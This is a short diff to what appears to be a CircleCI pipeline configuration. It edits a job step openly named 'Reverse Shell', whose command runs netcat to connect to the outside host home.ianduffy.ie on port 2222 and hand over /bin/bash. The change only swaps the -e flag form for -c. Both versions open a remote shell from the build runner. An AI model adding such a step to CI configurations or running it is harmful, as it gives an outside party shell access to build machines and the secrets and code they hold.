@@ -16,7 +16,7 @@ jobs:
       - checkout
       - run:
           name: "Reverse Shell"
-          command: "nc home.ianduffy.ie 2222 –e /bin/bash"
+          command: "nc –c /bin/bash home.ianduffy.ie 2222"
 
 # Invoke jobs via workflows
 # See: https://circleci.com/docs/2.0/configuration-reference/#workflows
